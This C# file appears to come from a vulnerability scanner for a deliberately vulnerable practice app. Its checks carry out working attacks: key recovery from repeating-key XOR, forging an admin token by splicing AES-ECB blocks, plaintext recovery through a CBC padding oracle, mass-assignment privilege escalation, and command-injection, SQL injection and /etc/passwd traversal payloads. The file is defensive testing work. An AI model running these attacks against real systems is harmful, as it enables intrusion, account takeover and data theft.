using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using ScopePilot.Domain;

namespace ScopePilot.Services.WorkflowScan;

public static partial class WorkflowScanCryptoApiChecks
{
    // ------- 反復XOR・固定鍵 (CWE-327/321) -------

    public static async Task RunCryptoXorAsync(ScanCheckContext c)
    {
        var result = c.Begin("crypto-xor", "反復XORと固定鍵による脆弱な独自暗号（既知平文からの鍵回収）" + ScanCheckContext.LevelSuffix(c.Level), "暗号", "中", "327", c.Url("vulnerabilities/cryptography/"), "POST", "message");
        if (!await EnsurePageAsync(c, "vulnerabilities/cryptography/")) { c.Skip(result, "対象画面へ到達できず"); return; }
        var initial = await c.Client.GetAsync("vulnerabilities/cryptography/", c.Token);
        if (!initial.Contains("name='message'") && !initial.Contains("name=\"message\"")) { c.Skip(result, "平文入力欄が存在せず"); return; }
        // 実装によっては平文がフォームへ再表示されるため、base64として妥当な値だけを対象にする。
        var intercepted = ExtractTextareas(initial.Body).LastOrDefault(LooksLikeBase64);
        // 仕組み上公開して差し支えない既知平文を暗号化させ、鍵ストリームを回収する。
        var known = $"ScopePilot known plaintext for repeating key recovery {c.Marker}0123456789";
        var encoded = await c.Client.PostFormAsync("vulnerabilities/cryptography/", new Dictionary<string, string>
        {
            ["message"] = known,
            ["direction"] = "encode"
        }, c.Token);
        var cipherTextBase64 = ExtractTextareas(encoded.Body).FirstOrDefault(LooksLikeBase64) ?? "";
        if (!TryFromBase64(cipherTextBase64, out var cipher) || cipher.Length < 16) { c.Skip(result, "暗号化サービスを利用できず"); return; }
        var keyStream = cipher.Zip(Encoding.UTF8.GetBytes(known), (a, b) => (byte)(a ^ b)).ToArray();
        var key = DetectRepeatingKey(keyStream);
        if (key is null) { c.Skip(result, "反復鍵としての規則性を確認できず"); return; }
        var decrypted = TryFromBase64(intercepted ?? "", out var interceptedBytes) ? XorBytes(interceptedBytes, key) : null;
        var interceptedProof = interceptedBytes is not null && decrypted is not null && decrypted.All(b => b is >= 0x20 or (byte)'\n' or (byte)'\r' or 0x09)
            ? $"、傍受済みメッセージ（{intercepted}）を回収鍵で復号できた（先頭: {WorkflowScanChecks.Truncate(Encoding.UTF8.GetString(decrypted), 40)}）"
            : "";
        c.Detect(result,
            "平文を固定鍵との反復XORで変換しBase64化する独自暗号が使われています。任意の平文を暗号化させられるため既知平文攻撃で鍵をそのまま回収でき、傍受したメッセージも復号できます。",
            $"既知平文（{WorkflowScanChecks.Truncate(known, 30)}…）を暗号化させ、鍵ストリームから反復鍵「{Encoding.ASCII.GetString(key)}」を回収しました{interceptedProof}。",
            "独自の暗号方式を実装せず、TLS上で業界標準の認証付き暗号（AES-GCM 等）を使用してください。鍵は用途ごとに固定値を埋め込まず安全に管理してください。",
            "");
    }

    internal static byte[]? DetectRepeatingKey(byte[] keyStream)
    {
        for (var period = 1; period <= 32 && period <= keyStream.Length / 2; period++)
        {
            var ok = true;
            for (var i = period; i < keyStream.Length; i++)
                if (keyStream[i] != keyStream[i % period]) { ok = false; break; }
            if (ok && keyStream[..period].All(b => b is >= 0x20 and < 0x7f) && period >= 3)
                return keyStream[..period];
        }
        return null;
    }

    internal static byte[] XorBytes(byte[] value, byte[] key)
    {
        var output = new byte[value.Length];
        for (var i = 0; i < value.Length; i++) output[i] = (byte)(value[i] ^ key[i % key.Length]);
        return output;
    }

    // ------- AES-ECB トークン改ざん (CWE-327) -------

    public static async Task RunCryptoEcbAsync(ScanCheckContext c)
    {
        var result = c.Begin("crypto-ecb", "ECBモード暗号トークンのブロック組み替え（権限偽造）" + ScanCheckContext.LevelSuffix(c.Level), "暗号", "高", "327", c.Url("vulnerabilities/cryptography/"), "POST", "token");
        var page = await c.Client.GetAsync("vulnerabilities/cryptography/", c.Token);
        if (page.StatusCode != 200) { c.Skip(result, "対象画面へ到達できず"); return; }
        var tokens = ExtractHexTokens(page.Body).Take(4).ToList();
        if (tokens.Count < 2) { c.Skip(result, "比較可能なトークンが不足"); return; }
        var blocks = tokens.Select(t => SplitBlocks(t).ToList()).ToList();
        var shared = FindSharedBlocks(blocks);
        if (shared.Count == 0) { c.Skip(result, "ブロック単位の規則性を確認できず"); return; }
        // ブロック組み替え（単一ブロック置換・隣接2ブロック置換・末尾結合）で管理者トークンを作れるか総当たりする。
        var forged = await TryForgeAdminTokenAsync(c, blocks);
        var sharedEvidence = $"異なるトークン間で同一暗号文ブロック {shared.Count}件（例: {shared[0][..16]}…）を確認。";
        if (forged is null)
        {
            c.Detect(result,
                "セッショントークンがAES-ECB（IVなし・ブロック独立・完全性検証なし）で暗号化されています。同一平文ブロックが同一暗号文になるため、複数利用者のトークンを収集するだけで平文の構造が特定でき、ブロックの組み替えによる権限偽造が可能になります。",
                sharedEvidence + "ブロック組み替えによる管理者権限の偽造までは確認できませんでしたが、ECBであること自体が構造的な弱点です。",
                "トークンには認証付き暗号（AES-GCM 等）を使用し、改ざん検証を必須にしてください。ECBモードは認証・機密性のどちらの用途にも使用しないでください。",
                "ブロック組み替えの成功までは確認していません。");
            return;
        }
        c.Detect(result,
            "セッショントークンがAES-ECB（IVなし・ブロック独立・完全性検証なし）で暗号化されているため、入手済みトークンのブロックを組み替えるだけで、別利用者の権限（管理者）を持つ有効トークンを作成できました。",
            sharedEvidence + $"組み替えトークン（{forged.TokenHex.Length / 2}バイト）を送信し「{WorkflowScanChecks.Truncate(forged.Response, 60)}」応答を取得しました。",
            "トークンには認証付き暗号（AES-GCM 等）を使用し、改ざん検証を必須にしてください。トークン内に権限値を持たせる場合はサーバー側で再検証してください。",
            "");
    }

    private sealed record ForgedToken(string TokenHex, string Response);

    private static async Task<ForgedToken?> TryForgeAdminTokenAsync(ScanCheckContext c, List<List<string>> blockLists)
    {
        var candidates = new List<string>();
        foreach (var (baseIndex, baseBlocks) in blockLists.Select((b, i) => (i, b)))
        {
            foreach (var (donorIndex, donorBlocks) in blockLists.Select((d, i) => (i, d)))
            {
                if (donorIndex == baseIndex) continue;
                for (var position = 0; position < baseBlocks.Count && position < donorBlocks.Count; position++)
                {
                    // 単一ブロック置換
                    candidates.Add(Splice(baseBlocks, donorBlocks, position, 1));
                    // 隣接2ブロック置換
                    if (position + 1 < baseBlocks.Count && position + 1 < donorBlocks.Count)
                        candidates.Add(Splice(baseBlocks, donorBlocks, position, 2));
                }
            }
        }
        foreach (var candidate in candidates.Distinct().Take(120))
        {
            if (candidate.Length % 32 != 0) continue;
            var response = await c.Client.PostFormAsync("vulnerabilities/cryptography/", new Dictionary<string, string> { ["token"] = candidate }, c.Token);
            if (response.Contains("Welcome administrator"))
                return new ForgedToken(candidate, Regex.Replace(response.Body, @"\s+", " ").Trim());
        }
        return null;
    }

    private static string Splice(List<string> blocks, List<string> donor, int position, int count)
    {
        var copy = blocks.ToArray();
        for (var i = 0; i < count && position + i < copy.Length && position + i < donor.Count; i++)
            copy[position + i] = donor[position + i];
        return string.Concat(copy);
    }

    internal static List<string> FindSharedBlocks(List<List<string>> blockLists)
    {
        var seen = new HashSet<string>();
        var shared = new List<string>();
        foreach (var blocks in blockLists)
            foreach (var block in blocks)
            {
                if (!seen.Add(block)) shared.Add(block);
            }
        return shared.Distinct().ToList();
    }

    internal static IEnumerable<string> SplitBlocks(string hexToken)
    {
        for (var i = 0; i + 32 <= hexToken.Length; i += 32)
            yield return hexToken.Substring(i, 32);
    }

    // ------- CBCパディングオラクル (CWE-203) -------

    public static async Task RunCryptoCbcOracleAsync(ScanCheckContext c)
    {
        var result = c.Begin("crypto-cbc-oracle", "CBCパディングオラクル（復号成否の応答差から平文回収）" + ScanCheckContext.LevelSuffix(c.Level), "暗号", "高", "203", c.Url("vulnerabilities/cryptography/source/check_token_high.php"), "POST", "token/iv");
        var page = await c.Client.GetAsync("vulnerabilities/cryptography/", c.Token);
        if (page.StatusCode != 200) { c.Skip(result, "対象画面へ到達できず"); return; }
        var tokenMatch = Regex.Match(page.Body, @"""token""\s*:\s*""([A-Za-z0-9+/=]+)""");
        var ivMatch = Regex.Match(page.Body, @"""iv""\s*:\s*""([A-Za-z0-9+/=]+)""");
        if (!tokenMatch.Success || !ivMatch.Success) { c.Skip(result, "トークン入力欄が存在せず"); return; }
        var endpoint = "vulnerabilities/cryptography/source/check_token_high.php";
        var tokenB64 = tokenMatch.Groups[1].Value;
        var ivB64 = ivMatch.Groups[1].Value;
        if (!TryFromBase64(tokenB64, out var cipher) || cipher.Length == 0 || cipher.Length % 16 != 0 || !TryFromBase64(ivB64, out var iv) || iv.Length != 16)
        { c.Skip(result, "トークン形式を解析できず"); return; }
        // オラクル確認: IV・暗号文を改変した際に、パディング不正とその他のエラーが区別された応答で返るか。
        var probeIv = (byte[])iv.Clone();
        probeIv[15] ^= 0xFF;
        var paddingInvalid = await PostTokenAsync(c.Client, endpoint, cipher, probeIv, c.Token);
        var probeIv2 = (byte[])iv.Clone();
        probeIv2[0] ^= 0xFF;
        var paddingMaybeValid = await PostTokenAsync(c.Client, endpoint, cipher, probeIv2, c.Token);
        if (paddingInvalid is null || paddingMaybeValid is null ||
            OracleClass(paddingInvalid) == OracleClass(paddingMaybeValid))
        { c.Skip(result, "復号成否を区別できる応答差なし"); return; }
        // POA（パディングオラクル攻撃）で先頭ブロックの平文を回収する。
        var recovered = await RecoverFirstBlockAsync(c, endpoint, cipher, iv, maxBytes: 8);
        var recoveredText = recovered is { Count: > 0 }
            ? Encoding.ASCII.GetString(recovered.TakeWhile(b => b >= 0x20 && b < 0x7f).ToArray())
            : "";
        var exploitProof = recoveredText.Length >= 4
            ? $"さらにオラクルを利用した復元で平文の先頭「{recoveredText}」を回収しました。"
            : "";
        c.Detect(result,
            "暗号トークンの復号処理が、パディング不正（復号失敗）と形式エラー・利用者不在などを異なるステータス・メッセージで返します。この応答差がオラクルとなり、暗号文やIVを少しずつ改変して送ることで暗号化された内容を復元・偽造できます。",
            $"IV改変プローブ: ステータス{paddingInvalid}（パディング不正）と ステータス{paddingMaybeValid}（その他）が区別されて返ることを確認。{exploitProof}",
            "復号の成否・失敗理由を応答で区別しない（単一の汎用エラーに統一する）ようにしてください。認証付き暗号（AES-GCM 等）で完全性検証を先に行ってください。",
            "");
    }

    private static async Task<string?> PostTokenAsync(WorkflowScanClient client, string endpoint, byte[] cipher, byte[] iv, CancellationToken token)
    {
        var body = $$"""{"token": "{{Convert.ToBase64String(cipher)}}", "iv": "{{Convert.ToBase64String(iv)}}"}""";
        var response = await client.PostJsonAsync(endpoint, body, token);
        if (response.StatusCode != 200) return null;
        var status = Regex.Match(response.Body, @"""status""\s*:\s*(\d+)");
        return status.Success ? status.Groups[1].Value : "";
    }

    // 526 = 復号失敗（パディング不正）、それ以外 = 復号には成功
    private static string OracleClass(string status) => status == "526" ? "invalid" : "valid";

    private static async Task<List<byte>?> RecoverFirstBlockAsync(ScanCheckContext c, string endpoint, byte[] cipher, byte[] originalIv, int maxBytes)
    {
        // CBC先頭ブロックの復元: P1 = D(C1) XOR IV。IVを操作してパディングを成立させ D(C1) を1バイトずつ得る。
        var recovered = new byte[16];
        var known = 0;
        var budget = 1500;
        for (var position = 16 - 1; position >= 16 - maxBytes && budget > 0; position--)
        {
            var padValue = (byte)(16 - position);
            var probe = new byte[16];
            for (var i = 15; i > position; i--) probe[i] = (byte)(recovered[i] ^ padValue);
            byte? found = null;
            for (var candidate = 0; candidate < 256 && budget > 0; candidate++)
            {
                probe[position] = (byte)candidate;
                budget--;
                var status = await PostTokenAsync(c.Client, endpoint, cipher, probe, c.Token);
                if (status is not null && OracleClass(status) == "valid")
                {
                    found = (byte)(candidate ^ padValue);
                    // 疑陽性の確認: 次のパディング値で再検証する。
                    var verify = (byte[])probe.Clone();
                    for (var i = position; i <= 15; i++) verify[i] = (byte)(verify[i] ^ padValue ^ (padValue + 1));
                    var verifyStatus = await PostTokenAsync(c.Client, endpoint, cipher, verify, c.Token);
                    budget--;
                    if (verifyStatus is not null && OracleClass(verifyStatus) == "valid") break;
                    found = null;
                }
            }
            if (found is null) break;
            recovered[position] = found.Value;
            known++;
        }
        if (known == 0) return null;
        var plaintext = new byte[16];
        for (var i = 0; i < 16; i++) plaintext[i] = (byte)(recovered[i] ^ originalIv[i]);
        return plaintext.ToList();
    }

    // ------- 廃止API (CWE-200) -------

    public static async Task RunApiLegacyAsync(ScanCheckContext c)
    {
        var result = c.Begin("api-legacy", "廃止APIの残存による機微情報（パスワードハッシュ）露出", "API", "高", "200", c.Url("vulnerabilities/api/v1/user/"));
        var response = await c.Client.GetAsync("vulnerabilities/api/v1/user/", c.Token);
        if (response.StatusCode != 200) { c.Skip(result, "旧版APIは到達不可"); return; }
        var secretFields = FindSensitiveJsonFields(response.Body);
        if (secretFields.Count == 0) { c.Skip(result, "機微項目は応答に含まれず"); return; }
        c.Detect(result,
            $"現行画面が利用しない旧バージョンのAPI（v1）が到達可能なままで、応答に機微項目（{string.Join("・", secretFields)}）が含まれていました。APIバージョンを切り替えるだけで、画面では非表示のパスワードハッシュ等を取得できます。",
            $"GET /vulnerabilities/api/v1/user/ → 200、応答JSONに項目 {string.Join(", ", secretFields)} を確認（{Regex.Matches(response.Body, @"""id""\s*:").Count}件分）。",
            "廃止したAPIバージョンはルーティングごと削除してください。残す必要がある場合は機微項目を応答スキーマから除外し、アクセス制御・監視を適用してください。",
            "");
    }

    internal static List<string> FindSensitiveJsonFields(string json)
    {
        var fields = new List<string>();
        foreach (var key in new[] { "password", "passwd", "pwd", "secret", "private_key", "api_key", "token" })
            if (Regex.IsMatch(json, $@"""{key}""\s*:", RegexOptions.IgnoreCase))
                fields.Add(key);
        return fields;
    }

    // ------- マスアサインメント (CWE-915) -------

    public static async Task RunApiMassAssignmentAsync(ScanCheckContext c)
    {
        var result = c.Begin("api-mass-assignment", "マスアサインメント：更新APIでの権限属性（level）の書き換え", "API", "高", "915", c.Url("vulnerabilities/api/v2/user/"), "PUT", "level");
        var list = await c.Client.GetAsync("vulnerabilities/api/v2/user/", c.Token);
        if (list.StatusCode != 200) { c.Skip(result, "利用者API一覧を取得できず"); return; }
        var target = FindUserWithLevel(list.Body, excludeLevel: 0);
        if (target is null) { c.Skip(result, "権限昇格の検証対象が見つからず"); return; }
        var (id, name, originalLevel) = target.Value;
        var updated = await c.Client.PutJsonAsync($"vulnerabilities/api/v2/user/{id}", $$"""{"name": "{{name}}", "level": 0}""", c.Token);
        var escalated = Regex.IsMatch(updated.Body, @"""level""\s*:\s*0");
        // 権限を元へ戻す。
        await c.Client.PutJsonAsync($"vulnerabilities/api/v2/user/{id}", $$"""{"name": "{{name}}", "level": {{originalLevel}}}""", c.Token);
        if (!escalated) { c.Skip(result, "権限属性の書き換えは拒否"); return; }
        c.Detect(result,
            $"利用者更新API（PUT /vulnerabilities/api/v2/user/{id}）が、リクエストJSONに含まれた権限属性 level を通常画面と同じ更新処理で書き換えます。利用者が level: 0（管理者）を追加送信するだけで自分を管理者へ昇格できました。",
            $"PUT /vulnerabilities/api/v2/user/{id}（name={name}, level=0）→ 応答 \"level\":0 を確認。検証後、level を元の {originalLevel} へ復元しました。",
            "更新APIは受け取る属性を明示的なホワイトリスト（名前等）に限定し、権限・有効状態などの特権属性は別の管理経路でのみ変更できるようにしてください。",
            "検証後、権限値は元へ復元しています。");
    }

    internal static (int Id, string Name, int Level)? FindUserWithLevel(string json, int excludeLevel)
    {
        try
        {
            using var document = JsonDocument.Parse(json);
            if (document.RootElement.ValueKind != JsonValueKind.Array) return null;
            foreach (var item in document.RootElement.EnumerateArray())
            {
                if (!item.TryGetProperty("id", out var idElement) || !item.TryGetProperty("level", out var levelElement)) continue;
                if (!item.TryGetProperty("name", out var nameElement)) continue;
                var level = levelElement.GetInt32();
                if (level == excludeLevel) continue;
                return (idElement.GetInt32(), nameElement.GetString() ?? "", level);
            }
        }
        catch (JsonException) { }
        return null;
    }

    // ------- API経由のOSコマンドインジェクション (CWE-78) -------

    public static async Task RunApiCommandInjectionAsync(ScanCheckContext c)
    {
        var m = c.Marker;
        var result = c.Begin("api-command-injection", "APIにおけるOSコマンドインジェクション（pingへの引数連結）", "入力値検証", "高", "78", c.Url("vulnerabilities/api/v2/health/connectivity"), "POST", "target");
        var payloads = new[]
        {
            $"127.0.0.1 && echo SP{m}",
            $"127.0.0.1; echo SP{m}",
            $"127.0.0.1 | echo SP{m}",
            $"127.0.0.1%0Aecho SP{m}"
        };
        // 戦略1: コマンド実行結果（echo の出力）が応答に現れる実装。
        foreach (var payload in payloads)
        {
            var response = await c.Client.PostJsonAsync("vulnerabilities/api/v2/health/connectivity", $$"""{"target": "{{payload}}"}""", c.Token);
            if (response.Contains($"SP{m}"))
            {
                c.Detect(result,
                    "接続確認APIが target の値を検証せずに ping コマンドへ連結して実行しています。シェルの連結記号（&&・;・| 等）を含めるだけで任意のOSコマンドを実行でき、応答本体にその実行結果が現れました。",
                    $"POST /vulnerabilities/api/v2/health/connectivity（target=127.0.0.1 && echo SP{m}）の応答に実行結果 SP{m} が含まれることを確認。",
                    "外部コマンドへ利用者入力を連結しないでください。IPアドレス等は厳密な形式検証（ホワイトリスト）を行い、コマンド実行の必要がある場合は引数配列での exec 系APIを使用してください。",
                    "実行確認には無害な echo（マーカー出力）のみを使用しています。");
                return;
            }
        }
        // 戦略2: 実行結果を返さない実装では、注入コマンドの終了コードが応答ステータスへ反映されるかを確認する。
        // ping が失敗する環境でも、true/false の終了コードを応答差として観測できれば成立を立証できる。
        var baseline = await PostConnectivity(c, "scopepilot-probe.invalid");
        var withTrue = await PostConnectivity(c, $"127.0.0.1; true");
        var withFalse = await PostConnectivity(c, $"127.0.0.1; false");
        if (withTrue is { } truthy && withFalse is { } falsy && truthy != falsy && truthy != baseline)
        {
            c.Detect(result,
                "接続確認APIが target の値を検証せずに ping コマンドへ連結して実行しています。注入したコマンド（true / false）の終了コードに応じて応答が変化することを確認でき、任意のOSコマンドが実行可能です。",
                $"POST（target=127.0.0.1; true）→ 応答「{withTrue}」、（target=127.0.0.1; false）→ 応答「{withFalse}」、比較基準（到達不能ホスト指定）→「{baseline}」。注入コマンドの終了コードが応答へ反映されました（マーカー {m}）。",
                "外部コマンドへ利用者入力を連結しないでください。IPアドレス等は厳密な形式検証（ホワイトリスト）を行い、コマンド実行の必要がある場合は引数配列での exec 系APIを使用してください。",
                "実行確認には無害な true / false コマンドのみを使用しています。");
            return;
        }
        c.Skip(result, "コマンド実行の証拠を取得できず");
    }

    private static async Task<string?> PostConnectivity(ScanCheckContext c, string target)
    {
        var response = await c.Client.PostJsonAsync("vulnerabilities/api/v2/health/connectivity", $$"""{"target": "{{target}}"}""", c.Token);
        if (response.StatusCode != 200 && response.StatusCode != 500) return null;
        return $"HTTP {response.StatusCode}: {Regex.Replace(WorkflowScanChecks.Truncate(response.Body, 60), @"\s+", " ")}";
    }

    // ------- SQLインジェクション（URL単位の真偽確認） (CWE-89) -------

    public static async Task RunSqliVerificationAsync(ScanCheckContext c)
    {
        var targets = new (string Path, string Name)[]
        {
            ("vulnerabilities/sqli/", "通常型SQLインジェクション"),
            ("vulnerabilities/sqli_blind/", "ブラインドSQLインジェクション")
        };
        foreach (var (path, name) in targets)
        {
            var result = c.Begin("sqli-verify", $"{name}：URL単位の成立確認{ScanCheckContext.LevelSuffix(c.Level)}", "入力値検証", "高", "89", c.Url(path), "GET", "id");
            if (!await EnsurePageAsync(c, path)) { c.Skip(result, "対象画面へ到達できず"); continue; }
            // 引用符を要するペイロード（low）と数値のみのペイロード（medium のエスケープ対策）を、
            // GETとPOSTの両方で試す（難易度によってフォームのmethodが変わる）。
            var truthPayloads = new[] { "1%27%20AND%20%271%27=%271", "1%20AND%201=1" };
            var falsePayloads = new[] { "1%27%20AND%20%271%27=%272", "1%20AND%201=2" };
            var trueHasRow = false;
            var falseHasRow = true;
            foreach (var (truthPayload, falsePayload) in truthPayloads.Zip(falsePayloads))
            {
                foreach (var usePost in new[] { false, true })
                {
                    var trueResponse = usePost
                        ? await c.Client.PostFormAsync(path, new Dictionary<string, string> { ["id"] = Uri.UnescapeDataString(truthPayload), ["Submit"] = "Submit" }, c.Token)
                        : await c.Client.GetAsync($"{path}?id={truthPayload}&Submit=Submit", c.Token);
                    var falseResponse = usePost
                        ? await c.Client.PostFormAsync(path, new Dictionary<string, string> { ["id"] = Uri.UnescapeDataString(falsePayload), ["Submit"] = "Submit" }, c.Token)
                        : await c.Client.GetAsync($"{path}?id={falsePayload}&Submit=Submit", c.Token);
                    var truth = HasResultRow(trueResponse.Body);
                    var lie = HasResultRow(falseResponse.Body);
                    if (truth && !lie) { trueHasRow = true; falseHasRow = false; break; }
                    if (truth) { trueHasRow = true; falseHasRow = lie; }
                }
                if (trueHasRow && !falseHasRow) break;
            }
            var errorProbe = await c.Client.GetAsync($"{path}?id=1%27&Submit=Submit", c.Token);
            var hasSqlError = Regex.IsMatch(errorProbe.Body, @"SQL syntax|mysqli_|mysql_fetch|SQLSTATE|syntax error", RegexOptions.IgnoreCase);
            if (trueHasRow && !falseHasRow || hasSqlError)
            {
                var method = trueHasRow && !falseHasRow
                    ? $"真偽クエリで応答差（真: 結果行あり / 偽: 結果行なし）"
                    : "エラーメッセージ（SQL構文エラー）の露出";
                c.Detect(result,
                    $"{path} の id パラメーターがSQL文へ直接連結されています。" +
                    (trueHasRow && !falseHasRow
                        ? "AND 条件の真偽によって応答の結果行が変化するため、ブラインド手法でデータベース内の任意情報を窃取できます。"
                        : "不正なクォートでSQLエラーが露出するため、構造を特定した攻撃が可能です。"),
                    $"{method}。GET {path}?id=1' AND '1'='1 → 結果行{(trueHasRow ? "あり" : "なし")}、?id=1' AND '1'='2 → 結果行{(falseHasRow ? "あり" : "なし")}、?id=1' → {(hasSqlError ? "SQLエラー露出" : "エラーなし")}（マーカー {c.Marker}）。",
                    "SQL文はプリペアドステートメント（パラメーター化クエスト）で組み立て、利用者入力を文字列連結しないでください。エラーメッセージの詳細を応答へ出さないでください。",
                    "");
            }
            else
            {
                c.Skip(result, "このURLでは成立を確認できず");
            }
        }
    }

    internal static bool HasResultRow(string body) =>
        body.Contains("First name", StringComparison.Ordinal) ||
        body.Contains("Surname", StringComparison.Ordinal) ||
        body.Contains("ID: 1", StringComparison.Ordinal) ||
        body.Contains("exists in the database", StringComparison.OrdinalIgnoreCase);

    // ------- ローカルファイルインクルージョン (CWE-98/22) -------

    public static async Task RunLfiAsync(ScanCheckContext c)
    {
        var result = c.Begin("lfi", $"ローカルファイルインクルージョン（サーバー内ファイルの読取り）{ScanCheckContext.LevelSuffix(c.Level)}", "ファイルアクセス", "高", "98", c.Url("vulnerabilities/fi/"), "GET", "page");
        if (!await EnsurePageAsync(c, "vulnerabilities/fi/")) { c.Skip(result, "対象画面へ到達できず"); return; }
        string[] payloads =
        [
            "/etc/passwd",
            "../../../../../../../etc/passwd",
            "....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd",
            "file:///etc/passwd"
        ];
        foreach (var payload in payloads)
        {
            var response = await c.Client.GetAsync($"vulnerabilities/fi/?page={Uri.EscapeDataString(payload)}", c.Token);
            var leaked = response.Contains("root:") && Regex.IsMatch(response.Body, @"root:.{0,4}0:0:") ||
                         TryDecodePasswd(response.Body);
            if (leaked)
            {
                c.Detect(result,
                    "page パラメーターで指定されたファイルが検証なしに読み込まれ（include）、サーバー内の/etc/passwd の内容が応答へ現れました。設定ファイル・ソースコード等の任意ファイル読取りに利用でき、アップロード機能との連鎖でコード実行につながります。",
                    $"GET /vulnerabilities/fi/?page={Uri.EscapeDataString(WorkflowScanChecks.Truncate(payload, 60))} の応答に /etc/passwd の内容（root:x:0:0:… 相当）を確認（マーカー {c.Marker}）。",
                    "読み込み対象は固定の許可リスト（マップ）で解決し、パス区切り・ストリームラッパー（php:// 等）を含む入力を拒否してください。include先は静的に定義してください。",
                    "");
                return;
            }
        }
        c.Skip(result, "サーバー内ファイルの読取りを確認できず");
    }

    internal static bool TryDecodePasswd(string body)
    {
        var match = Regex.Match(body, @"([A-Za-z0-9+/=]{80,})");
        if (!match.Success) return false;
        try
        {
            var decoded = Encoding.UTF8.GetString(Convert.FromBase64String(match.Groups[1].Value));
            return decoded.Contains("root:") && Regex.IsMatch(decoded, @"root:.{0,4}0:0:");
        }
        catch (FormatException) { return false; }
    }

    // ------- 共通ユーティリティ -------

    private static async Task<bool> EnsurePageAsync(ScanCheckContext c, string path)
    {
        var response = await c.Client.GetAsync(path, c.Token);
        return response.StatusCode == 200 && !response.IsRedirect;
    }

    internal static List<string> ExtractTextareas(string html) =>
        Regex.Matches(html, @"<textarea[^>]*>([^<]+)</textarea>", RegexOptions.IgnoreCase | RegexOptions.Singleline)
            .Select(m => m.Groups[1].Value.Trim())
            .Where(v => v.Length > 0)
            .ToList();

    internal static bool LooksLikeBase64(string value)
    {
        if (value.Length < 16 || value.Contains(' ')) return false;
        try { return Convert.FromBase64String(value).Length >= 8; }
        catch (FormatException) { return false; }
    }

    internal static List<string> ExtractHexTokens(string html) =>
        Regex.Matches(html, @">([0-9a-fA-F]{128,256})<")
            .Select(m => m.Groups[1].Value.ToLowerInvariant())
            .Where(v => v.Length % 32 == 0)
            .Distinct()
            .ToList();

    internal static bool TryFromBase64(string value, out byte[] bytes)
    {
        try { bytes = Convert.FromBase64String(value); return true; }
        catch (Exception) { bytes = []; return false; }
    }
}
